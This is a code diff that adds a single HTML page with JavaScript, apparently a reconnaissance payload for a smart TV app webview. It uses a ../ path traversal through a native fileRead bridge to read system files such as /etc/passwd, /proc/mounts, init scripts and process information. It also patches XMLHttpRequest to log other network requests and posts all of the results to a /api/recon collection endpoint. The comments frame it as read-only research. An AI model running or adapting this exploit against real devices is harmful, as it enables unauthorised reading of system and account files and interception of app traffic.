@@ -1,0 +1,85 @@
+<!doctype html>
+<!-- Focused v3+v4 pass for 55E7QTUK: dumps at load (synchronous), then ONE
+     short timer for the XHR wire capture + self proc reads. Motivation: the
+     full-page ladder recon-e7qtuk.html posted v1..v3 but its +6.5s setTimeout
+     chain never fired on this webview — minimized timer reliance here.
+     Read-only; nothing written to the TV. /etc/shadow deliberately not dumped.
+     Traversal prefix is known from v2: ../ escapes the /APPS/ base. -->
+<html><head><meta charset="utf-8"><title>recon v3+v4</title></head>
+<body><pre id="out">recon v3+v4…</pre><script>
+(function () {
+  "use strict";
+  var out = document.getElementById("out");
+  var report = { started: new Date().toISOString(), ua: navigator.userAgent, v3: {}, v4: {} };
+  var P = "../";
+  function trunc(s, n) { s = String(s == null ? "" : s); return s.length > n ? s.slice(0, n) + "…(" + s.length + ")" : s; }
+  function rawOf(msg) {
+    if (typeof msg === "string") return trunc(msg, 65536);
+    try { return trunc(JSON.stringify(msg), 65536); } catch (e) { return trunc(String(msg), 300); }
+  }
+  function save(tag) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "/api/recon", true);
+      x.setRequestHeader("Content-Type", "application/json");
+      x.send(JSON.stringify({ tag: tag, at: new Date().toISOString(), report: report }));
+      out.textContent = out.textContent + "\n[saved " + tag + "]";
+    } catch (e) { out.textContent = out.textContent + "\n[save failed " + tag + "]"; }
+  }
+  function line(t) { out.textContent = out.textContent + "\n" + t; }
+  function rd(path) {
+    try {
+      var r = HiUtils_createRequest("fileRead", { path: path, mode: 6 });
+      var ok = r && r.ret === true;
+      return { path: path, ok: ok, ret: r && r.ret, msgRaw: rawOf(r && r.msg), rawRet: r && r.ret, rate: typeof r };
+    } catch (e) { return { path: path, ok: false, msgRaw: "EXC " + e }; }
+  }
+
+  // ---------- v3: dumps (synchronous) ----------
+  var DUMPS = ["proc/mounts", "etc/inittab", "etc/passwd",
+               "etc/init.d/rcS", "etc/rc.local", "etc/profile"];
+  report.v3 = { prefix: P, dumps: {} };
+  for (var i = 0; i < DUMPS.length; i++) {
+    var r = rd(P + DUMPS[i]);
+    report.v3.dumps[DUMPS[i]] = { path: r.path, ok: r.ok, ret: r.ret,
+                                  body: r.ok ? r.msgRaw : null,
+                                  err: r.ok ? null : r.msgRaw };
+    line("v3: " + DUMPS[i] + (r.ok ? " ok(" + r.msgRaw.length + "b)" : " fail " + trunc(r.msgRaw, 100)));
+  }
+  save("v3");
+
+  // ---------- v4: patch XHR NOW, stir, single short timer, capture ----------
+  var wire = [];
+  try {
+    var o = XMLHttpRequest.prototype.open, s = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.open = function (m, u) {
+      this.__alv = { m: m, u: String(u) };
+      return o.apply(this, arguments);
+    };
+    XMLHttpRequest.prototype.send = function (b) {
+      if (this.__alv && this.__alv.u.indexOf("/api/recon") === -1) {
+        wire.push({ m: this.__alv.m, u: trunc(this.__alv.u, 300),
+                    body: trunc((b == null ? null : (typeof b === "string" ? b : "(binary)")), 4000) });
+      }
+      return s.apply(this, arguments);
+    };
+    report.v4.patched = true;
+  } catch (e) { report.v4.patch_error = String(e); }
+  var stir = rd("websdk/Appinfo.json");
+  report.v4.stir_ok = stir.ok;
+  setTimeout(function () {
+    try {
+      report.v4.wire = wire;
+      report.v4.self_cmdline = rd(P + "proc/self/cmdline");
+      report.v4.self_status = rd(P + "proc/self/status");
+      report.v4.cmdline = report.v4.self_cmdline.ok ? report.v4.self_cmdline.msgRaw
+                                                    : ("FAIL " + report.v4.self_cmdline.msgRaw);
+      report.v4.status = report.v4.self_status.ok ? report.v4.self_status.msgRaw
+                                                  : ("FAIL " + report.v4.self_status.msgRaw);
+      line("v4: wire=" + wire.length + " cmdline.ok=" + report.v4.self_cmdline.ok +
+           " status.ok=" + report.v4.self_status.ok);
+    } catch (e) { report.v4.fatal = String(e); line("v4 error: " + e); }
+    save("v4"); save("end");
+  }, 1200);
+})();
+</script></body></html>
